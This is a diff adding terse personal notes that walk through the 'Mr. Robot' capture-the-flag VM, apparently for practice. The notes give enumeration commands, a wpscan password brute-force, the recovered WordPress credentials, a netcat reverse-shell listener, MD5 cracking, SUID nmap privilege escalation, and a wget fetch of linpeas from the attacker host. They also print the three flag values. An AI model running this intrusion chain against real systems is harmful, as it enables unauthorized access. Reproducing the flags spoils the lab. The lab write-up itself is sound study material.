@@ -1,0 +1,86 @@
+## Mr.robot
+192.168.1.107 ifconfig/ip a  
+
+mr robot machine -netdiscover
+ip 192.168.1.108 
+
+nmap 192.168.1.108 --min-rate 10000
+ports 80,443 open http,https 
+
+nikto -h http://192.168.1.108,  gobuster dir --url http://192.168.1.108 --wordlist /usr/share/wordlists/dirbuster/medium-2-3.txt 
+
+directories  
+/wp-login
+/wp-admin 
+/admin
+/robots 
+
+/robots
+http://192.168.1.108/key-1-of-3.txt
+073403c8a58a1f80d943455fb30724b9
+
+http://192.168.1.108/fsocity.disc (download the file it's the wordlist)
+wc -l fscoity.disc 
+cat fsocity.disc | sort -u >> filtered.txt  (or)
+cat fsocity.disc | sort | uniq >> filtered.txt  
+
+wpscan --url http://192.168.1.108/wp-login.php --usernames /root/Desktop/mrrobot/filtered.txt --passwords /root/Desktop/mrrobot/filtered.txt  
+
+Valid Combinations Found:
+ | Username: ELLIOT, Password: ER28-0652
+ | Username: elliot, Password: ER28-0652
+ | Username: Elliot, Password: ER28-0652 
+ 
+ nc -lnvp 1234 (pentestmonkey)
+ ls 
+ cd /home/robot
+ ls 
+ key-2-of-3.txt 
+ password.raw-md5 
+ 
+ cat password
+ robot:c3fcd3d76192e4007dfb496cca67e13b (md5)
+ result: 	abcdefghijklmnopqrstuvwxyz  
+ 
+whoami 
+daemon 
+ 
+echo 'import pty; pty.spawn("/bin/bash")' >> /tmp/yash.py 
+python /tmp/yash.py 
+
+daemon@linux:~$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz 
+
+robot@linux:/usr/sbin$ cd /home/robot
+pwd 
+ls 
+cat key-2-of-3.txt  
+822c73956184f694993bede3eb39f959
+
+we still have to do the privilege escalation to get the root user (p.s we're still robot user)(sudo -l )
+2 METHODS FROM 
+
+1ST WAY BY ABACHY BLOG 
+find / -user root -perm -4000 2>/dev/null 
+ /usr/local/bin/nmap --version 
+ nmap --interactive 
+ nmap> !bash -p 
+ bash-4.3# cd /root
+  bash-4.3# ls -al
+  bash-4.3# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4 
+  
+2ND WAY BY YASIR SIR 
+python3 -m http.server 80
+wget http://192.168.1.107/linpeas.sh
+chmod 777 linpeas.sh 
+ls -la 
+./linpeas.sh 
+
+
+
+
+ 
+
